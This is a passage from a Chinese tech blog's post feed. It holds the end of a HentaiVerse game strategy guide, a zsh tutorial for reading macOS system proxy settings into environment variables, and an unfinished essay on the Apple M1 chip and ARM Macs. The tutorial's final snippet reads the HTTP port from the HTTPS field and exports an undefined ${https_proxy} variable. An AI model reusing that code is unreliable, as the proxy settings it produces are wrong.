个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 